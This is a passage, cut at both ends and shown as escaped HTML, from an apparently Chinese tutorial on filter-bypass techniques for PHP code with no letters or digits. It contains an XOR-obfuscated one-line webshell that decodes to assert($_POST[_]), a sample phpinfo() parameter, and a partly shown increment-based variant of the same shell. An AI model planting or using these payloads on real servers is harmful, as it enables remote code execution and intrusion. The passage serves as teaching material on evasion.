class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; answer:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; valid:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; valid:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(i) ^ &lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(j) == &lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(c)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp1 += i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp2 += j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;tmp1为:&amp;quot;&lt;/span&gt;,tmp1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;tmp2为:&amp;quot;&lt;/span&gt;,tmp2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拼接起来:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;=(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%40&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%21&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7B&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7B&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7B&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%1E&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7E&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0C&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7C&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08&amp;#x27;&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;// $_=assert&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;_&amp;#x27;&lt;/span&gt;.(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0D&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%5D&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0F&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%40&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0E&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%5D&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0B&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%5F&amp;#x27;&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;// $__=_POST&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$$__&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//$___=$_POST&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;[_]);&lt;span class=&#34;comment&#34;&gt;//assert($_POST[_]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;放到一排就是：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;=(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%40&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%21&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7B&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7B&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7B&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%1E&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7E&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0C&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%7C&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%08&amp;#x27;&lt;/span&gt;);&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;_&amp;#x27;&lt;/span&gt;.(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0D&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%5D&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0F&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%40&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0E&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%5D&amp;#x27;&lt;/span&gt;).(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%0B&amp;#x27;&lt;/span&gt;^&lt;span class=&#34;string&#34;&gt;&amp;#x27;%5F&amp;#x27;&lt;/span&gt;);&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$$__&lt;/span&gt;;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;[_]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post传参:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_=&lt;span class=&#34;title function_ invoke__&#34;&gt;phpinfo&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;三自增&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三自增&#34;&gt;#&lt;/a&gt; 三。自增&lt;/h1&gt;
&lt;p&gt;在处理字符运算时，php 沿袭了 perl 的语法而不是 c 的，规则:&lt;br&gt;
 从最后一个字符按照 ascii 顺序向上进一位，也就是 A–&amp;gt;Z,a–&amp;gt;z，如果是 Z 或 z 字符，再进一位表示多加一个字符。&lt;/p&gt;
&lt;figure class=&#34;highlight perl&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$a=&lt;span class=&#34;string&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;say&lt;/span&gt; ++$a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&lt;span class=&#34;string&#34;&gt;&amp;quot;ba&amp;quot;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;say&lt;/span&gt; ++$a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&lt;span class=&#34;string&#34;&gt;&amp;quot;bz&amp;quot;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;say&lt;/span&gt; ++$a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ca&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&lt;span class=&#34;string&#34;&gt;&amp;quot;Az&amp;quot;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;say&lt;/span&gt; ++$a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ba&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&lt;span class=&#34;string&#34;&gt;&amp;quot;bZ&amp;quot;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;say&lt;/span&gt; ++$a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&lt;span class=&#34;string&#34;&gt;&amp;quot;zz&amp;quot;&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;say&lt;/span&gt; ++$a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aaa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;mark&gt;注意&lt;/mark&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。&lt;/li&gt;
&lt;li&gt;递增或递减其他字符变量则无效，原字符串没有变化。&lt;br&gt;
这里放两个 payload:&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; 1.&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;=[].&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;Array&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;[&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;];   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;A&amp;quot;，$__没有定义，默认为False也即0，此时$___=&amp;quot;A&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$__=&amp;quot;A&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$_=&amp;quot;A&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;S&amp;quot;，此时$__=&amp;quot;S&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$___=&amp;quot;AS&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$___=&amp;quot;ASS&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$__=&amp;quot;A&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;E&amp;quot;，此时$__=&amp;quot;E&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$___=&amp;quot;ASSE&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;R&amp;quot;，此时$__=&amp;quot;R&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$___=&amp;quot;ASSER&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;T&amp;quot;，此时$__=&amp;quot;T&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$___=&amp;quot;ASSERT&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$__=&amp;quot;A&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;_&amp;quot;&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$____=&amp;quot;_&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;P&amp;quot;，此时$__=&amp;quot;P&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$____=&amp;quot;_P&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$__=&amp;quot;A&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;O&amp;quot;，此时$__=&amp;quot;O&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$____=&amp;quot;_PO&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;S&amp;quot;，此时$__=&amp;quot;S&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$____=&amp;quot;_POS&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;++;   &lt;span class=&#34;comment&#34;&gt;//得到&amp;quot;T&amp;quot;，此时$__=&amp;quot;T&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$____&lt;/span&gt; .= &lt;span class=&#34;variable&#34;&gt;$__&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$____=&amp;quot;_POST&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$_&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$$____&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//$_=$_POST&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$___&lt;/span&gt;(&lt;span 